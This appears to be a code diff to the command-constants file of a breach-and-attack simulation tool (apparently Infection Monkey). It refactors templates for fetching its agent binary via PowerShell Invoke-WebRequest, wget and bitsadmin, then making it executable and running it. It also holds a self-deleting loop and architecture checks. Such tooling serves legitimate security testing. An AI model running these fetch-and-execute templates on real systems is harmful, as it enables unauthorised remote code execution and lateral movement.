@@ -17,13 +17,19 @@ RDP_CMDLINE_HTTP_VBS = 'set o=!TMP!\!RANDOM!.tmp&@echo Set objXMLHTTP=CreateObje
 DELAY_DELETE_CMD = 'cmd /c (for /l %%i in (1,0,2) do (ping -n 60 127.0.0.1 & del /f /q %(file_path)s & if not exist %(file_path)s exit)) > NUL 2>&1'
 
 # Commands used for downloading monkeys
-POWERSHELL_HTTP = "powershell -NoLogo -Command \"Invoke-WebRequest -Uri \\\'%%(http_path)s\\\' -OutFile \\\'%%(monkey_path)s\\\' -UseBasicParsing; %%(monkey_path)s %s %%(parameters)s\"" % (DROPPER_ARG, )
-WGET_HTTP = "wget -O %%(monkey_path)s %%(http_path)s && chmod +x %%(monkey_path)s && %%(monkey_path)s %s %%(parameters)s" % (DROPPER_ARG, )
-RDP_CMDLINE_HTTP = 'bitsadmin /transfer Update /download /priority high %%(http_path)s %%(monkey_path)s&&start /b %%(monkey_path)s %%(type)s %%(parameters)s'
-
+POWERSHELL_HTTP_UPLOAD = "powershell -NoLogo -Command \"Invoke-WebRequest -Uri \\\'%(http_path)s\\\' -OutFile \\\'%(monkey_path)s\\\' -UseBasicParsing\""
+POWERSHELL_HTTP_UPLOAD_NOT_ESCAPED = "powershell -NoLogo -Command \"Invoke-WebRequest -Uri \'%(http_path)s\' -OutFile \'%(monkey_path)s\' -UseBasicParsing\""
+WGET_HTTP_UPLOAD = "wget -O %(monkey_path)s %(http_path)s"
+RDP_CMDLINE_HTTP = 'bitsadmin /transfer Update /download /priority high %(http_path)s %(monkey_path)s'
+CHMOD_MONKEY = "chmod +x %(monkey_path)s"
+RUN_MONKEY = " %(monkey_path)s %(monkey_type)s %(parameters)s"
 # Commands used to check for architecture and if machine is exploitable
-CHECK_WINDOWS = "echo %s && wmic os get osarchitecture" % ID_STRING
-CHECK_LINUX = "echo %s && lscpu" % ID_STRING
+CHECK_COMMAND = "echo %s" % ID_STRING
+# Architecture checking commands
+ARCH_WINDOWS = "wmic os get osarchitecture"
+ARCH_LINUX = "lscpu"
 
 # Commands used to check if monkeys already exists
 EXISTS = "ls %s"
+
+DOWNLOAD_TIMEOUT = 300
